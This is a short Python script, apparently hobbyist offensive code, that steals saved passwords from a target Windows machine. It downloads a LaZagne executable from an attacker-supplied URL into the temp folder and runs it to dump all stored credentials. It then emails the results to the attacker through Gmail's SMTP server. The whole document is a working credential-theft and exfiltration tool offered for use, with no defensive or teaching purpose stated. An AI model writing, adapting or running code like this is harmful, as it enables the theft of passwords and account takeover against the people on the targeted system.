#author Kushagra Ojha
# stelaing-saved-passwod-from-any-target-system
#steling saved passwod from any system and emailing it to yourself.
import requests, subprocess, smtplib , os ,tempfile
def download(url):
    get_response = requests.get(url)
		#here we are naming the file -1 for reading from back
    file_name = url.split("/") [-1]
		#storing the binary 
    with open(file_name, "wb")as out_file:
        out_file.write(get_response.content)
#starting emailing process
def send_mail(email, password, message):
	#google give us a SMTP server to use
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit

temp_directory =tempfile.gettempdir()
os.chdir(temp_directory)
#start your apache service or any server that have laZange in exe form
# you can clone laZange from github https://github.com/AlessandroZ/LaZagne.git
download("url to download lazange")
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail("your email", "passwod", result)
